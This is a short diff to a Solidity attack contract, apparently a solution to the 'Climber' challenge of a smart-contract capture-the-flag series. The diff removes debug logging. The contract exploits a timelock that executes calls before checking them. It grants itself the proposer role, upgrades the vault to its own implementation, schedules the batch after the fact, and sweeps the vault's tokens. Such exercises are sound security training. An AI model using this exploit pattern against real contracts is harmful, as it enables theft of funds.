@@ -3,7 +3,6 @@ pragma solidity ^0.8.3;
 import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 import "@openzeppelin/contracts/access/Ownable.sol";
 
-import "hardhat/console.sol";
 import "./ClimberTimelock.sol";
 import "./ClimberVaultV2.sol";
 
@@ -23,12 +22,10 @@ contract ClimberAttack is Ownable{
     }
 
     function start() onlyOwner public {
-        console.log("start address(this) is %s", address(this));
         ClimberVaultV2 vaultV2 = new ClimberVaultV2();
         targets[0] = address(_climberTimelock);
         values[0] = 0;
-        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)",
-                                _climberTimelock.PROPOSER_ROLE(), address(this));
+        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)",_climberTimelock.PROPOSER_ROLE(), address(this));
         targets[1] = address(_upgradeable);
         values[1] = 0;
         dataElements[1] = abi.encodeWithSignature("upgradeTo(address)", address(vaultV2));
@@ -37,7 +34,6 @@ contract ClimberAttack is Ownable{
         dataElements[2] = abi.encodeWithSignature("schedule()");
 
         _climberTimelock.execute(targets, values, dataElements, salt);
-        console.log("owner() is %s", owner());
         address(_upgradeable).call{value: 0}(abi.encodeWithSignature("sweepFunds(address,address)", _tokenAddress, owner()));
     }
 
